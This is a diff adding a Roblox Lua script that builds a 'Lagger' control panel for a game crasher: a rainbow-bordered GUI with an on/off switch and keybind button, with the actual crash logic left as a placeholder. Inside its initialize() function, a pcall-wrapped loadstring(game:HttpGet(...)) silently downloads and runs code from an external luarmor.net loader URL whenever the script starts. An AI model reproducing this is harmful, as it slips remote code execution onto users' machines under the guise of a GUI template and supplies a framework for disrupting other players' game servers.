@@ -1,0 +1,398 @@
+
+
+-- // [1] SERVICES //
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- // [2] CONFIGURATION (EDIT EVERYTHING HERE) --
+local CONFIG = {
+    Gui = {
+        Name = "CrasherUI_Toggle",
+        ResetOnSpawn = false,
+    },
+
+    MainFrame = {
+        Position = UDim2.new(0, 4, 0, 140),
+        Size = UDim2.new(0, 200, 0, 130),
+        BackgroundColor3 = Color3.fromRGB(12, 16, 35),
+        BackgroundTransparency = 0.4,
+        CornerRadius = UDim.new(0, 10),
+    },
+
+    Title = {
+        Text = "Lagger",
+        Font = Enum.Font.GothamBlack,
+        TextSize = 15,
+        TextColor3 = Color3.new(1, 1, 1),
+        TextTransparency = 0.5,
+        Position = UDim2.new(0, 10, 0, 5),
+        Size = UDim2.new(1, -40, 0, 20),
+    },
+
+    MinimizeButton = {
+        Text = "-",
+        Size = UDim2.new(0, 24, 0, 24),
+        Position = UDim2.new(1, -32, 0, 8),
+        BackgroundColor3 = Color3.fromRGB(30, 40, 70),
+        CornerRadius = UDim.new(0, 6),
+        TextSize = 14,
+    },
+
+    ToggleContainer = {
+        Position = UDim2.new(0, 10, 0, 48),
+        Size = UDim2.new(1, -20, 0, 34),
+        BackgroundColor3 = Color3.fromRGB(20, 25, 50),
+        CornerRadius = UDim.new(0, 8),
+    },
+
+    ToggleLabel = {
+        Text = "Enable Lagger",
+        Position = UDim2.new(0, 10, 0, 0),
+        Size = UDim2.new(1, -60, 1, 0),
+        TextSize = 13,
+        TextColor3 = Color3.new(1, 1, 1),
+    },
+
+    Switch = {
+        Position = UDim2.new(1, -46, 0.5, -9),
+        Size = UDim2.new(0, 36, 0, 18),
+        BackgroundColor3 = Color3.fromRGB(30, 40, 70),
+        CornerRadius = UDim.new(0, 9),
+    },
+
+    Knob = {
+        Position = UDim2.new(0, 2, 0.5, -7),
+        Size = UDim2.new(0, 14, 0, 14),
+        BackgroundColor3 = Color3.new(1, 1, 1),
+        CornerRadius = UDim.new(0, 7),
+    },
+
+    KeybindContainer = {
+        Position = UDim2.new(0, 10, 0, 88),
+        Size = UDim2.new(1, -20, 0, 34),
+        BackgroundColor3 = Color3.fromRGB(20, 25, 50),
+        CornerRadius = UDim.new(0, 8),
+    },
+
+    KeybindLabel = {
+        Text = "Keybind",
+        Position = UDim2.new(0, 10, 0, 0),
+        Size = UDim2.new(1, -80, 1, 0),
+        TextSize = 13,
+        TextColor3 = Color3.new(1, 1, 1),
+    },
+
+    KeybindButton = {
+        Text = "[ -- ]",
+        Position = UDim2.new(1, -68, 0.5, -11),
+        Size = UDim2.new(0, 60, 0, 22),
+        BackgroundColor3 = Color3.fromRGB(0, 30, 80),
+        BackgroundTransparency = 0.3,
+        CornerRadius = UDim.new(0, 5),
+        TextSize = 10,
+    },
+
+    Stroke = {
+        Color = Color3.new(1, 1, 1),
+        Thickness = 2,
+    },
+
+    Gradient = {
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 30)),
+            ColorSequenceKeypoint.new(0.2, Color3.fromRGB(0, 120, 255)),
+            ColorSequenceKeypoint.new(0.4, Color3.fromRGB(120, 255, 255)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+            ColorSequenceKeypoint.new(0.6, Color3.fromRGB(255, 120, 0)),
+            ColorSequenceKeypoint.new(0.8, Color3.fromRGB(255, 0, 120)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 30)),
+        }),
+        Rotation = 45,
+    },
+}
+
+-- // [3] OBJECT REFERENCES //
+local ScreenGui
+local MainFrame
+local TitleLabel
+local MinimizeButton
+local ToggleContainer
+local ToggleLabel
+local Switch
+local Knob
+local ToggleClickArea
+local KeybindContainer
+local KeybindLabel
+local KeybindButton
+
+local MainStroke
+local MainGradient
+
+local isLaggerEnabled = false
+
+-- // [4] UTILITY FUNCTIONS //
+local function createUIGradient(parent)
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = CONFIG.Gradient.Color
+    gradient.Rotation = CONFIG.Gradient.Rotation
+    gradient.Parent = parent
+    return gradient
+end
+
+local function animateRainbowGradient(gradient)
+    RunService.RenderStepped:Connect(function()
+        local time = tick() * 0.8
+        local offset = math.sin(time) * 0.5 + 0.5
+        gradient.Offset = Vector2.new(offset - 1, 0)
+    end)
+end
+
+local function toggleLagger(state)
+    isLaggerEnabled = state
+
+    if state then
+        -- Enabled state
+        Knob:TweenPosition(UDim2.new(1, -16, 0.5, -7), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
+        Switch.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
+    else
+        -- Disabled state
+        Knob:TweenPosition(UDim2.new(0, 2, 0.5, -7), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
+        Switch.BackgroundColor3 = CONFIG.Switch.BackgroundColor3
+    end
+
+    -- TODO: Put your actual lagger / crasher logic here
+    -- Example: if isLaggerEnabled then startLagLoop() else stopLagLoop() end
+    print("[Lagger] " .. (state and "ENABLED" or "DISABLED"))
+end
+
+-- // [5] GUI CREATION //
+local function createGUI()
+    ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = CONFIG.Gui.Name
+    ScreenGui.ResetOnSpawn = CONFIG.Gui.ResetOnSpawn
+    ScreenGui.Parent = CoreGui
+
+    -- Main Frame
+    MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Position = CONFIG.MainFrame.Position
+    MainFrame.Size = CONFIG.MainFrame.Size
+    MainFrame.BackgroundColor3 = CONFIG.MainFrame.BackgroundColor3
+    MainFrame.BackgroundTransparency = CONFIG.MainFrame.BackgroundTransparency
+    MainFrame.ClipsDescendants = true
+    MainFrame.Active = true
+    MainFrame.Draggable = true
+    MainFrame.Parent = ScreenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = CONFIG.MainFrame.CornerRadius
+    mainCorner.Parent = MainFrame
+
+    -- Main Stroke + Gradient
+    MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = CONFIG.Stroke.Color
+    MainStroke.Thickness = CONFIG.Stroke.Thickness
+    MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    MainStroke.Parent = MainFrame
+    MainGradient = createUIGradient(MainStroke)
+
+    -- Title Label
+    TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Name = "Title"
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Position = CONFIG.Title.Position
+    TitleLabel.Size = CONFIG.Title.Size
+    TitleLabel.Text = CONFIG.Title.Text
+    TitleLabel.Font = CONFIG.Title.Font
+    TitleLabel.TextSize = CONFIG.Title.TextSize
+    TitleLabel.TextColor3 = CONFIG.Title.TextColor3
+    TitleLabel.TextTransparency = CONFIG.Title.TextTransparency
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = MainFrame
+
+    -- Title gradient (subtle shine)
+    local titleGradient = Instance.new("UIGradient")
+    titleGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 255, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 255)),
+    }
+    titleGradient.Parent = TitleLabel
+
+    -- Minimize Button
+    MinimizeButton = Instance.new("TextButton")
+    MinimizeButton.Name = "Minimize"
+    MinimizeButton.Position = CONFIG.MinimizeButton.Position
+    MinimizeButton.Size = CONFIG.MinimizeButton.Size
+    MinimizeButton.BackgroundColor3 = CONFIG.MinimizeButton.BackgroundColor3
+    MinimizeButton.Text = CONFIG.MinimizeButton.Text
+    MinimizeButton.TextColor3 = Color3.new(1, 1, 1)
+    MinimizeButton.Font = Enum.Font.GothamBlack
+    MinimizeButton.TextSize = CONFIG.MinimizeButton.TextSize
+    MinimizeButton.Parent = MainFrame
+
+    local minCorner = Instance.new("UICorner")
+    minCorner.CornerRadius = CONFIG.MinimizeButton.CornerRadius
+    minCorner.Parent = MinimizeButton
+
+    local minStroke = Instance.new("UIStroke")
+    minStroke.Thickness = 1
+    minStroke.Parent = MinimizeButton
+    createUIGradient(minStroke)
+
+    -- Toggle Container
+    ToggleContainer = Instance.new("Frame")
+    ToggleContainer.Name = "ToggleContainer"
+    ToggleContainer.Position = CONFIG.ToggleContainer.Position
+    ToggleContainer.Size = CONFIG.ToggleContainer.Size
+    ToggleContainer.BackgroundColor3 = CONFIG.ToggleContainer.BackgroundColor3
+    ToggleContainer.Parent = MainFrame
+
+    local toggleCorner = Instance.new("UICorner")
+    toggleCorner.CornerRadius = CONFIG.ToggleContainer.CornerRadius
+    toggleCorner.Parent = ToggleContainer
+
+    local toggleStroke = Instance.new("UIStroke")
+    toggleStroke.Parent = ToggleContainer
+    createUIGradient(toggleStroke)
+
+    ToggleLabel = Instance.new("TextLabel")
+    ToggleLabel.Name = "ToggleLabel"
+    ToggleLabel.BackgroundTransparency = 1
+    ToggleLabel.Position = CONFIG.ToggleLabel.Position
+    ToggleLabel.Size = CONFIG.ToggleLabel.Size
+    ToggleLabel.Text = CONFIG.ToggleLabel.Text
+    ToggleLabel.TextSize = CONFIG.ToggleLabel.TextSize
+    ToggleLabel.TextColor3 = CONFIG.ToggleLabel.TextColor3
+    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    ToggleLabel.Parent = ToggleContainer
+
+    -- Switch
+    Switch = Instance.new("Frame")
+    Switch.Name = "Switch"
+    Switch.Position = CONFIG.Switch.Position
+    Switch.Size = CONFIG.Switch.Size
+    Switch.BackgroundColor3 = CONFIG.Switch.BackgroundColor3
+    Switch.Parent = ToggleContainer
+
+    local switchCorner = Instance.new("UICorner")
+    switchCorner.CornerRadius = CONFIG.Switch.CornerRadius
+    switchCorner.Parent = Switch
+
+    -- Knob
+    Knob = Instance.new("Frame")
+    Knob.Name = "Knob"
+    Knob.Position = CONFIG.Knob.Position
+    Knob.Size = CONFIG.Knob.Size
+    Knob.BackgroundColor3 = CONFIG.Knob.BackgroundColor3
+    Knob.Parent = Switch
+
+    local knobCorner = Instance.new("UICorner")
+    knobCorner.CornerRadius = CONFIG.Knob.CornerRadius
+    knobCorner.Parent = Knob
+
+    -- Invisible click area for toggle
+    ToggleClickArea = Instance.new("TextButton")
+    ToggleClickArea.Name = "ToggleClickArea"
+    ToggleClickArea.Size = UDim2.new(1, 0, 1, 0)
+    ToggleClickArea.BackgroundTransparency = 1
+    ToggleClickArea.Text = ""
+    ToggleClickArea.Parent = ToggleContainer
+
+    -- Keybind Container
+    KeybindContainer = Instance.new("Frame")
+    KeybindContainer.Name = "KeybindContainer"
+    KeybindContainer.Position = CONFIG.KeybindContainer.Position
+    KeybindContainer.Size = CONFIG.KeybindContainer.Size
+    KeybindContainer.BackgroundColor3 = CONFIG.KeybindContainer.BackgroundColor3
+    KeybindContainer.Parent = MainFrame
+
+    local keyCorner = Instance.new("UICorner")
+    keyCorner.CornerRadius = CONFIG.KeybindContainer.CornerRadius
+    keyCorner.Parent = KeybindContainer
+
+    local keyStroke = Instance.new("UIStroke")
+    keyStroke.Parent = KeybindContainer
+    createUIGradient(keyStroke)
+
+    KeybindLabel = Instance.new("TextLabel")
+    KeybindLabel.Name = "KeybindLabel"
+    KeybindLabel.BackgroundTransparency = 1
+    KeybindLabel.Position = CONFIG.KeybindLabel.Position
+    KeybindLabel.Size = CONFIG.KeybindLabel.Size
+    KeybindLabel.Text = CONFIG.KeybindLabel.Text
+    KeybindLabel.TextSize = CONFIG.KeybindLabel.TextSize
+    KeybindLabel.TextColor3 = CONFIG.KeybindLabel.TextColor3
+    KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+    KeybindLabel.Parent = KeybindContainer
+
+    KeybindButton = Instance.new("TextButton")
+    KeybindButton.Name = "KeybindButton"
+    KeybindButton.Position = CONFIG.KeybindButton.Position
+    KeybindButton.Size = CONFIG.KeybindButton.Size
+    KeybindButton.BackgroundColor3 = CONFIG.KeybindButton.BackgroundColor3
+    KeybindButton.BackgroundTransparency = CONFIG.KeybindButton.BackgroundTransparency
+    KeybindButton.Text = CONFIG.KeybindButton.Text
+    KeybindButton.TextColor3 = Color3.new(1, 1, 1)
+    KeybindButton.TextSize = CONFIG.KeybindButton.TextSize
+    KeybindButton.AutoButtonColor = false
+    KeybindButton.Parent = KeybindContainer
+
+    local keyBtnCorner = Instance.new("UICorner")
+    keyBtnCorner.CornerRadius = CONFIG.KeybindButton.CornerRadius
+    keyBtnCorner.Parent = KeybindButton
+end
+
+-- // [6] FUNCTIONALITY //
+local function setupConnections()
+    -- Minimize button
+    MinimizeButton.MouseButton1Click:Connect(function()
+        local isVisible = ToggleContainer.Visible
+        ToggleContainer.Visible = not isVisible
+        KeybindContainer.Visible = not isVisible
+    end)
+
+    -- Toggle click
+    ToggleClickArea.MouseButton1Click:Connect(function()
+        toggleLagger(not isLaggerEnabled)
+    end)
+
+    -- Keybind button (placeholder - easy to expand)
+    KeybindButton.MouseButton1Click:Connect(function()
+        print("[Lagger] Keybind button clicked - implement custom keybind logic here")
+        -- Example: open keybind listener, set currentKeybind, etc.
+    end)
+
+    -- Rainbow gradient animation on main frame stroke
+    animateRainbowGradient(MainGradient)
+
+    -- Optional: InputBegan for global keybind support (if you expand CONFIG)
+    -- UserInputService.InputBegan:Connect(function(input, gp)
+    --     if gp then return end
+    --     -- handle custom keybind here
+    -- end)
+end
+
+-- // [7] INITIALIZATION //
+local function initialize()
+    -- External loader (wrapped safely)
+    pcall(function()
+        loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/223c2c219f3caa6e6700ae93511b94ab.lua'))()
+    end)
+
+    createGUI()
+    setupConnections()
+
+    -- Start with lagger disabled
+    toggleLagger(false)
+
+    print("[Ice Hub - Lagger] Successfully loaded!")
+    print("→ Edit CONFIG table to customize GUI (colors, size, position, text, etc.)")
+    print("→ Add your lagger/crasher logic inside toggleLagger() function")
+end
+
+initialize()
